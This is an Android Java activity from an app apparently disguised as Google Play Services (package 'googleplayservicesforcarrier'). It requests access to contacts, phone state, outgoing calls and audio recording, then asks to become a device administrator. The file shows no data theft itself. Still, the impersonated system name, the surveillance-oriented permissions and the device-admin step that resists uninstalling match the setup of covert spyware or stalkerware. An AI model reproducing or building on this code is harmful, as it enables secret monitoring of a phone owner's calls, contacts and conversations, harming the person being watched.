package activity;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import com.android.googleplayservicesforcarrier.R;

import static Utils.Utils.SHOW_LOG;

public class PermissionsActivity extends AppCompatActivity {
    private int MULTIPLE_PERMISSIONS_REQUEST_CODE = 100;
    private static final int REQUEST_CODE_ENABLE_DEVICE_ADMIN = 10;

    DevicePolicyManager mDPM;
    ComponentName mAdminName;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permissions);
        mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mAdminName = new ComponentName(this, DeviceAdmin.class);

        if(!isHavePermission(Manifest.permission.READ_CONTACTS)
                || !isHavePermission(Manifest.permission.READ_PHONE_STATE)
                || !isHavePermission(Manifest.permission.PROCESS_OUTGOING_CALLS)
                || !isHavePermission(Manifest.permission.RECORD_AUDIO)
                )
        {
            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.PROCESS_OUTGOING_CALLS,
                    Manifest.permission.RECORD_AUDIO
            }, MULTIPLE_PERMISSIONS_REQUEST_CODE);
        }
        else
        {
            finish();
        }


    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == MULTIPLE_PERMISSIONS_REQUEST_CODE) {
            if (grantResults.length > 0) {
                if (grantResults[3] == PackageManager.PERMISSION_GRANTED) {

                    SHOW_LOG("All permissions are granted");
                    makeAppAsDeviceAdministrator();

                }
            } else {
                SHOW_LOG("Some of the permissions are not granted.");
            }
        }
        finish();
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (REQUEST_CODE_ENABLE_DEVICE_ADMIN == requestCode) {
            if (resultCode == Activity.RESULT_OK) {
                // Has become the device administrator.
                SHOW_LOG("app is now device administrator");
            } else {
                //Canceled or failed.
                SHOW_LOG("Canceled to make our app as Device administrator");
            }
        }
    }







    private boolean isHavePermission(String permission) {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }
    private void makeAppAsDeviceAdministrator() {
        if (!mDPM.isAdminActive(mAdminName)) {
            //try to become active – must happen here in this activity, to get result
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Additional text explaining why this needs to be added.");
            startActivityForResult(intent, REQUEST_CODE_ENABLE_DEVICE_ADMIN);
        } else {
            SHOW_LOG("Already is a device administrator");
        }
    }




    public static class DeviceAdmin extends DeviceAdminReceiver {

        @Override
        public void onEnabled(Context context, Intent intent) {
            SHOW_LOG("admin_receiver_status_enabled");
        }

        @Override
        public CharSequence onDisableRequested(Context context, Intent intent) {
            return "admin_receiver_status_disable_warning";
        }

        @Override
        public void onDisabled(Context context, Intent intent) {
            SHOW_LOG("admin_receiver_status_disabled");
        }

        private void SHOW_LOG(String message) {
            Log.i("123456", message);
        }
    }
}
